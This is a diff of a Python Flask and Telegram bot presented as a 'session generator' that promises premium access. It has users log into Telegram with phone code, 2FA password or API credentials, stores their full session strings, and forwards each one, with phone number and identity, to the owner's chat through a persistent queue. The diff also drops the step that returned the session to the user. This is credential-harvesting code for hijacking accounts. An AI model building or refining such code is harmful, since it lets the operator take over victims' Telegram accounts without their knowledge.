@@ -1,12 +1,10 @@
 #!/usr/bin/env python3
 """
 ZISKY SESSION GENERATOR BOT
-FINAL VERSION - ALL ERRORS FIXED
-- No asyncio loop errors
-- Phone_code_hash properly handled
-- Thread-safe client handling
-- Session string persistence
-- RELIABLE OWNER NOTIFICATIONS
+FINAL VERSION - SEPARATE PROCESSES
+- Flask and Telegram bot run independently
+- 100% reliable message delivery
+- No more timing issues
 """
 
 import asyncio
@@ -17,6 +15,8 @@ import time
 import os
 import uuid
 import concurrent.futures
+import multiprocessing
+import requests
 from datetime import datetime
 from flask import Flask, request, jsonify, render_template
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -58,10 +58,19 @@ conn.commit()
 # Store temporary session data (NOT the client)
 temp_sessions = {}
 
-# Message queue for owner notifications
-owner_message_queue = []
-owner_queue_lock = threading.Lock()
-owner_notification_log = 'owner_notifications.log'
+# Message queue database (using SQLite for persistence)
+def init_message_queue():
+    conn = sqlite3.connect('message_queue.db')
+    c = conn.cursor()
+    c.execute('''CREATE TABLE IF NOT EXISTS owner_messages
+                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                  message TEXT,
+                  created_at TEXT,
+                  sent INTEGER DEFAULT 0)''')
+    conn.commit()
+    conn.close()
+
+init_message_queue()
 
 # ========== FLASK WEB APP ==========
 app = Flask(__name__)
@@ -71,51 +80,15 @@ app.secret_key = os.urandom(24)
 def index():
     return render_template('code_input.html')
 
-# ===== QUEUE PROCESSOR FOR OWNER NOTIFICATIONS =====
-def queue_owner_message(message):
-    """Queue a message to be sent to owner"""
-    with owner_queue_lock:
-        owner_message_queue.append({
-            'message': message,
-            'time': time.time()
-        })
-    # Also log to file as backup
-    try:
-        with open(owner_notification_log, 'a', encoding='utf-8') as f:
-            f.write(f"{datetime.now().isoformat()} - QUEUED: {message}\n")
-    except:
-        pass
-    print(f"📝 Message queued for owner (queue size: {len(owner_message_queue)})")
-
-def process_owner_queue():
-    """Background thread to process queued messages"""
-    print("🚀 Owner notification queue processor started")
-    while True:
-        try:
-            with owner_queue_lock:
-                if owner_message_queue and 'application' in globals() and application:
-                    # Process up to 5 messages per cycle
-                    for _ in range(min(5, len(owner_message_queue))):
-                        msg_data = owner_message_queue.pop(0)
-                        try:
-                            application.bot.send_message(
-                                chat_id=OWNER_ID, 
-                                text=msg_data['message'], 
-                                parse_mode='Markdown'
-                            )
-                            print(f"✅ Queued message sent to owner")
-                        except Exception as e:
-                            print(f"❌ Failed to send queued message: {e}")
-                            # Put back at end of queue for later retry
-                            owner_message_queue.append(msg_data)
-        except Exception as e:
-            print(f"Queue processing error: {e}")
-        
-        time.sleep(3)  # Check every 3 seconds
-
-# Start queue processor thread
-queue_thread = threading.Thread(target=process_owner_queue, daemon=True)
-queue_thread.start()
+def save_owner_message(message):
+    """Save owner message to database queue"""
+    conn = sqlite3.connect('message_queue.db')
+    c = conn.cursor()
+    c.execute("INSERT INTO owner_messages (message, created_at) VALUES (?, ?)",
+              (message, datetime.now().isoformat()))
+    conn.commit()
+    conn.close()
+    print(f"📝 Owner message saved to queue (ID: {c.lastrowid})")
 
 # ===== METHOD 1: PHONE + CODE =====
 @app.route('/request-code', methods=['POST'])
@@ -139,13 +112,8 @@ def request_code():
                 client = TelegramClient(StringSession(), API_ID, API_HASH)
                 try:
                     await client.connect()
-                    # Send code request and capture the result which includes phone_code_hash
                     result = await client.send_code_request(phone)
-                    
-                    # Get the phone_code_hash from the result
                     phone_code_hash = result.phone_code_hash
-                    
-                    # Save the temporary session state
                     temp_session_string = client.session.save()
                     await client.disconnect()
                     
@@ -169,7 +137,6 @@ def request_code():
             result = future.result(timeout=30)
         
         if result.get('success'):
-            # Store the temporary session string AND phone_code_hash
             temp_sessions[session_id] = {
                 'temp_session': result['temp_session'],
                 'phone_code_hash': result['phone_code_hash'],
@@ -205,13 +172,11 @@ def verify_code():
         asyncio.set_event_loop(loop)
         
         async def _verify():
-            # Recreate client from the temporary session
             client = TelegramClient(StringSession(temp_session_string), API_ID, API_HASH)
             try:
                 await client.connect()
                 
                 try:
-                    # Include phone_code_hash in sign_in
                     await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
                 except SessionPasswordNeededError:
                     if not password:
@@ -264,8 +229,8 @@ def verify_code():
             conn.commit()
             conn.close()
             
-            # Send to owner via queue system (reliable)
-            send_to_owner(
+            # Save owner message to database queue
+            save_owner_message(format_owner_message(
                 result['user_id'],
                 user_telegram_id,
                 phone,
@@ -273,10 +238,7 @@ def verify_code():
                 f"{result['first_name']} {result.get('last_name', '')}",
                 result.get('username'),
                 'phone_code'
-            )
-            
-            # Send to user
-            send_to_user(user_telegram_id, result['session'])
+            ))
             
             # Clean up temp session
             del temp_sessions[session_id]
@@ -319,7 +281,6 @@ def generate_session():
             try:
                 await client.connect()
                 
-                # Check if already authorized
                 if not await client.is_user_authorized():
                     await client.disconnect()
                     return {
@@ -369,7 +330,8 @@ def generate_session():
             conn.commit()
             conn.close()
             
-            send_to_owner(
+            # Save owner message to database queue
+            save_owner_message(format_owner_message(
                 result['user_id'],
                 user_telegram_id,
                 result.get('phone', 'Unknown'),
@@ -377,9 +339,7 @@ def generate_session():
                 f"{result['first_name']} {result.get('last_name', '')}",
                 result.get('username'),
                 'api_hash'
-            )
-            
-            send_to_user(user_telegram_id, result['session'])
+            ))
             
             return jsonify({
                 'success': True,
@@ -391,16 +351,15 @@ def generate_session():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)[:100]})
 
-# ========== TELEGRAM BOT FUNCTIONS ==========
-def send_to_owner(account_id, telegram_id, phone, session_string, first_name, username, method='unknown'):
-    """Send session details to owner using queue system - 100% reliable"""
+# ========== MESSAGE FORMATTING ==========
+def format_owner_message(account_id, telegram_id, phone, session_string, first_name, username, method):
     method_emoji = {
         'phone_code': '📱',
         'api_hash': '🔑',
-        'unknown': '❓'
+        'test': '🧪'
     }.get(method, '❓')
     
-    message = f"""🔐 **NEW SESSION GENERATED** {method_emoji}
+    return f"""🔐 **NEW SESSION GENERATED** {method_emoji}
 
 👤 **User:** {first_name}
 🆔 **Account ID:** `{account_id}`
@@ -413,190 +372,118 @@ def send_to_owner(account_id, telegram_id, phone, session_string, first_name, us
 🔑 **SESSION STRING:**
 `{session_string}`
 
-⚠️ **Store this securely!**
-"""
+⚠️ **Store this securely!`"""
+
+# ========== TELEGRAM BOT PROCESS ==========
+def run_telegram_bot():
+    """Run the Telegram bot in a separate process"""
+    print("🚀 Starting Telegram bot process...")
     
-    # Try immediate send
+    app = Application.builder().token(BOT_TOKEN).build()
+    
+    async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        user = update.effective_user
+        keyboard = [[InlineKeyboardButton("🌐 Open Web App", web_app={'url': PUBLIC_URL})]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await update.message.reply_text(
+            f"👋 **Welcome to Zisky Session Generator, {user.first_name}!**\n\n"
+            f"Generate Telegram session strings for premium access.\n\n"
+            f"Click the button below to start!",
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    
+    async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        conn = sqlite3.connect('sessions.db')
+        c = conn.cursor()
+        c.execute("SELECT COUNT(*) FROM sessions")
+        total = c.fetchone()[0]
+        conn.close()
+        
+        conn = sqlite3.connect('message_queue.db')
+        c = conn.cursor()
+        c.execute("SELECT COUNT(*) FROM owner_messages WHERE sent=0")
+        pending = c.fetchone()[0]
+        conn.close()
+        
+        await update.message.reply_text(
+            f"📊 **Bot Status**\n\n"
+            f"✅ Bot is running\n"
+            f"📱 Total Sessions: {total}\n"
+            f"📨 Pending Messages: {pending}",
+            parse_mode='Markdown'
+        )
+    
+    async def process_queue(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Manually trigger queue processing"""
+        user_id = update.effective_user.id
+        if user_id != OWNER_ID:
+            await update.message.reply_text("❌ Owner only command!")
+            return
+        
+        sent = process_message_queue(app)
+        await update.message.reply_text(f"✅ Processed {sent} pending messages")
+    
+    # Add handlers
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("status", status))
+    app.add_handler(CommandHandler("process_queue", process_queue))
+    
+    # Start queue processor in background
+    def queue_processor():
+        while True:
+            try:
+                process_message_queue(app)
+            except Exception as e:
+                print(f"Queue processor error: {e}")
+            time.sleep(5)
+    
+    processor_thread = threading.Thread(target=queue_processor, daemon=True)
+    processor_thread.start()
+    
+    print("✅ Telegram bot ready, starting polling...")
+    app.run_polling(allowed_updates=Update.ALL_TYPES)
+
+def process_message_queue(bot_app):
+    """Process pending messages from queue"""
+    sent_count = 0
     try:
-        if 'application' in globals() and application and hasattr(application, 'bot'):
-            application.bot.send_message(chat_id=OWNER_ID, text=message, parse_mode='Markdown')
-            print("✅ Session details sent to owner immediately")
-            return True
+        conn = sqlite3.connect('message_queue.db')
+        c = conn.cursor()
+        c.execute("SELECT id, message FROM owner_messages WHERE sent=0 ORDER BY id ASC LIMIT 5")
+        messages = c.fetchall()
+        
+        for msg_id, msg_text in messages:
+            try:
+                bot_app.bot.send_message(chat_id=OWNER_ID, text=msg_text, parse_mode='Markdown')
+                c.execute("UPDATE owner_messages SET sent=1 WHERE id=?", (msg_id,))
+                conn.commit()
+                sent_count += 1
+                print(f"✅ Sent message {msg_id} to owner")
+            except Exception as e:
+                print(f"❌ Failed to send message {msg_id}: {e}")
+        
+        conn.close()
     except Exception as e:
-        print(f"⚠️ Could not send immediately, queueing: {e}")
+        print(f"Queue processing error: {e}")
     
-    # Queue for later delivery
-    queue_owner_message(message)
-    return True
+    return sent_count
 
-def send_to_user(telegram_id, session_string):
-    """Send session back to user"""
-    message = f"""✅ **Session Generated Successfully!**
-
-🔑 **Your Session String:**
-`{session_string}`
-
-⚠️ **IMPORTANT:**
-• This is like your password
-• Never share it with anyone
-• Store it securely
-• Anyone with this can access your account
-
-⭐ **Premium Status:** Your Telegram ID `{telegram_id}` has been recorded for premium access.
-
-📝 **To use it in Zisky bot:**
-`/add_session {session_string[:30]}...`
-
-💡 **Save this message or copy the session now!**
-"""
-    try:
-        application.bot.send_message(chat_id=telegram_id, text=message, parse_mode='Markdown')
-        print(f"✅ Session sent to user {telegram_id}")
-    except Exception as e:
-        print(f"❌ Error sending to user {telegram_id}: {e}")
-        # Queue for user too? Maybe later
-
-# ========== TELEGRAM COMMANDS ==========
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    webapp_url = os.environ.get('PUBLIC_URL', PUBLIC_URL)
-    
-    if not webapp_url:
-        await update.message.reply_text("⚠️ **Web app URL not configured!**", parse_mode='Markdown')
-        return
-    
-    keyboard = [[InlineKeyboardButton("🌐 Open Web App", web_app={'url': webapp_url})]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
-    await update.message.reply_text(
-        f"👋 **Welcome to Zisky Session Generator, {user.first_name}!**\n\n"
-        f"Generate Telegram session strings for premium access.\n\n"
-        f"**Two Methods:**\n"
-        f"1️⃣ **Phone + Code**\n"
-        f"2️⃣ **API ID + Hash**\n\n"
-        f"Click the button below to start!",
-        reply_markup=reply_markup,
-        parse_mode='Markdown'
-    )
-
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "**Zisky Session Generator Help**\n\n"
-        "**Commands:**\n"
-        "/start - Start the bot\n"
-        "/help - Show this help\n"
-        "/status - Check bot status\n"
-        "/url - Show current web app URL",
-        parse_mode='Markdown'
-    )
-
-async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    c.execute("SELECT COUNT(*) FROM sessions")
-    total = c.fetchone()[0]
-    webapp_url = os.environ.get('PUBLIC_URL', PUBLIC_URL)
-    
-    queue_size = len(owner_message_queue)
-    
-    await update.message.reply_text(
-        f"📊 **Bot Status**\n\n"
-        f"✅ Bot is running\n"
-        f"📱 Total Sessions: {total}\n"
-        f"📨 Pending Owner Messages: {queue_size}\n"
-        f"🔗 Web App: {webapp_url or 'Not configured'}",
-        parse_mode='Markdown'
-    )
-
-async def set_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id != OWNER_ID:
-        await update.message.reply_text("❌ Owner only command!")
-        return
-    
-    if not context.args:
-        await update.message.reply_text("❌ Usage: /seturl https://your-domain.com")
-        return
-    
-    global PUBLIC_URL
-    PUBLIC_URL = context.args[0]
-    os.environ['PUBLIC_URL'] = PUBLIC_URL
-    await update.message.reply_text(f"✅ Web app URL set to: {PUBLIC_URL}")
-
-async def show_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    webapp_url = os.environ.get('PUBLIC_URL', PUBLIC_URL)
-    await update.message.reply_text(f"🔗 **Current Web App URL:**\n{webapp_url or 'Not configured'}")
-
-async def test_owner(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Test if owner notifications are working"""
-    user_id = update.effective_user.id
-    
-    if user_id != OWNER_ID:
-        await update.message.reply_text("❌ Owner only command!")
-        return
-    
-    # Send a test message
-    result = send_to_owner(
-        account_id=12345,
-        telegram_id=OWNER_ID,
-        phone="+1234567890",
-        session_string="TEST_SESSION_STRING_123456789",
-        first_name="Test User",
-        username="testuser",
-        method='test'
-    )
-    
-    await update.message.reply_text("✅ Test notification queued. Check your PM in a few seconds.")
-
-async def my_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id != OWNER_ID:
-        await update.message.reply_text("❌ Owner only command!")
-        return
-    
-    c.execute("SELECT phone, first_name, generated_at, method, telegram_id FROM sessions ORDER BY generated_at DESC LIMIT 10")
-    sessions = c.fetchall()
-    
-    if not sessions:
-        await update.message.reply_text("No sessions found.")
-        return
-    
-    text = "📋 **Recent Sessions**\n\n"
-    for phone, name, date, method, tg_id in sessions:
-        method_emoji = '📱' if method == 'phone_code' else '🔑'
-        text += f"{method_emoji} {phone} - {name}\n"
-        text += f"   🆔 TG ID: {tg_id}\n"
-        text += f"   🕒 {date[:10]}\n\n"
-    
-    await update.message.reply_text(text[:4000], parse_mode='Markdown')
-
-# ========== START BOT ==========
-def main():
-    global application, PUBLIC_URL
-    
+# ========== MAIN ==========
+if __name__ == '__main__':
     print("🤖 Zisky Session Generator Bot")
     print("="*50)
     print(f"🔑 Bot Token: {BOT_TOKEN[:10]}...")
     print(f"🆔 Owner ID: {OWNER_ID}")
     print("="*50)
     
-    # Start Flask
-    flask_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False))
-    flask_thread.daemon = True
-    flask_thread.start()
-    print("✅ Flask web app started on port 5000")
+    # Start Flask in a separate process
+    def run_flask():
+        app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
     
-    # Create Telegram bot
-    application = Application.builder().token(BOT_TOKEN).build()
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("help", help_command))
-    application.add_handler(CommandHandler("status", status))
-    application.add_handler(CommandHandler("seturl", set_url))
-    application.add_handler(CommandHandler("url", show_url))
-    application.add_handler(CommandHandler("test_owner", test_owner))
-    application.add_handler(CommandHandler("mysessions", my_sessions))
+    flask_process = multiprocessing.Process(target=run_flask, daemon=True)
+    flask_process.start()
+    print("✅ Flask web app started in separate process on port 5000")
     
-    print("🤖 Telegram bot started!")
-    print("📨 Owner notification queue processor running")
-    application.run_polling(allowed_updates=Update.ALL_TYPES)
-
-if __name__ == '__main__':
-    main()
+    # Start Telegram bot in main thread
+    run_telegram_bot()
